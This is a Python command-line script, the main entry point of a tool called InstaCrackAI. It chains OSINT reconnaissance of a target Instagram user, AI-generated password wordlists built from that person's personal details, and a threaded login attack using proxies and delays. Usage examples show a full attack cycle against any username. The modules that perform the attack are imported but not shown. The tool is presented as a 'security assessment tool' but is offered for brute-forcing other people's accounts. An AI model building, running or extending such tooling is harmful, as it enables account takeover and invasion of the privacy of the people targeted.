#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  InstaCrackAI — Advanced Instagram Security Assessment Tool  ║
║  OSINT Recon + AI Password Gen + Login Attack               ║
║  Linux / Termux compatible                                   ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys
import argparse
from rich.console import Console
from rich.panel import Panel

from modules.recon import InstaRecon
from modules.ai_passgen import AIPasswordGenerator
from modules.attacker import InstagramAttacker

console = Console()

BANNER = """
[bold cyan]
 ██▓  ███▄    █   ██████ ▄▄▄█████▓ ▄▄▄       ▄████▄   ██▀███   ▄▄▄       ▄████▄   ██ ▄▀▀
▓██▒  ██ ▀█   █ ▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▀▄
▒██▒ ▓██  ▀█ ██▒░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓██ █▄
░██░ ▓██▒  ▐▌██▒  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██▒ █▄
░██░ ▒██░   ▓██░▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░░▒██▒ █▄
░▓   ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░░░ ▒▒ ▓▒
 ▒ ░ ░ ░░   ░ ▒░░ ░▒  ░ ░    ░      ▒   ▒▒ ░  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
 ▒ ░    ░   ░ ░ ░  ░  ░    ░        ░   ▒   ░          ░░   ░   ░   ▒   ░        ░ ░░ ░
 ░            ░       ░                 ░  ░░ ░         ░           ░  ░░ ░      ░  ░
                                            ░                          ░
[/bold cyan]
[dim]OSINT Recon • AI Password Gen • Login Attack[/dim]
[dim]Linux / Termux • v2.0[/dim]
"""


def main():
    parser = argparse.ArgumentParser(
        description="InstaCrackAI — Instagram Security Assessment Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python instacrack.py target_user --recon                    # OSINT recon only
  python instacrack.py target_user --gen-wordlist 18000       # Generate AI wordlist
  python instacrack.py target_user --attack wordlist.txt      # Login attack
  python instacrack.py target_user --recon --gen-wordlist 18000 --attack   # Full cycle
  python instacrack.py target_user --full                     # Interactive full mode
        """
    )

    parser.add_argument("username", help="Target Instagram username")
    parser.add_argument("--recon", "-r", action="store_true", help="Run OSINT recon")
    parser.add_argument("--gen-wordlist", "-g", type=int, metavar="N",
                        help="Generate AI password wordlist (N passwords)")
    parser.add_argument("--attack", "-a", type=str, metavar="FILE",
                        help="Run login attack using wordlist FILE")
    parser.add_argument("--full", "-f", action="store_true",
                        help="Interactive full mode (recon + AI gen + attack)")
    parser.add_argument("--threads", "-t", type=int, default=3,
                        help="Number of threads for attack (default: 3)")
    parser.add_argument("--delay", "-d", type=float, default=2.0,
                        help="Delay between attempts in seconds (default: 2.0)")
    parser.add_argument("--proxy", "-p", type=str, help="Proxy list file (one per line)")
    parser.add_argument("--output", "-o", choices=["json", "csv"], default="json",
                        help="Recon export format")

    args = parser.parse_args()

    console.print(BANNER)

    if not any([args.recon, args.gen_wordlist, args.attack, args.full]):
        parser.print_help()
        console.print("\n[yellow][!] Use --full for interactive mode[/yellow]")
        return

    target = args.username

    # ── Mode 1: Full Interactive ──
    if args.full:
        # (1) Recon
        console.print("[bold]═══ PHASE 1: Reconnaissance ═══[/bold]\n")
        recon = InstaRecon(target)
        recon.gather()
        recon.display()
        recon.export(args.output)

        # (2) AI Password Generation
        console.print("\n[bold]═══ PHASE 2: AI Password Generation ═══[/bold]")
        ai_gen = AIPasswordGenerator()
        info = ai_gen.collect_personal_info_interactive()
        wordlist = ai_gen.generate_from_personal_info(info, target_count=18000)
        wl_file = ai_gen.save_wordlist(wordlist, username=target)

        # (3) Attack
        console.print("\n[bold]═══ PHASE 3: Login Attack ═══[/bold]")
        go = input("\n  Start login attack? (y/N): ").strip().lower()
        if go == "y":
            attacker = InstagramAttacker(
                target, wordlist,
                proxy_file=args.proxy,
                threads=args.threads,
                delay=args.delay,
            )
            attacker.attack()
            attacker.display_summary()
        return

    # ── Mode 2: Recon only ──
    if args.recon:
        recon = InstaRecon(target)
        recon.gather()
        recon.display()
        recon.export(args.output)

    # ── Mode 3: Generate wordlist ──
    wordlist = None
    wl_file = None
    if args.gen_wordlist:
        ai_gen = AIPasswordGenerator()
        info = ai_gen.collect_personal_info_interactive()
        wordlist = ai_gen.generate_from_personal_info(info, target_count=args.gen_wordlist)
        wl_file = ai_gen.save_wordlist(wordlist, username=target)

    # ── Mode 4: Attack ──
    if args.attack:
        if not wordlist:
            # Load from file
            with open(args.attack, "r", encoding="utf-8") as f:
                wordlist = [line.strip() for line in f if line.strip()]
            console.print(f"[dim]Loaded {len(wordlist)} passwords from {args.attack}[/dim]")

        attacker = InstagramAttacker(
            target, wordlist,
            proxy_file=args.proxy,
            threads=args.threads,
            delay=args.delay,
        )
        attacker.attack()
        attacker.display_summary()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[yellow][!] Interrupted by user.[/yellow]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red][✗] Fatal error: {e}[/red]")
        sys.exit(1)
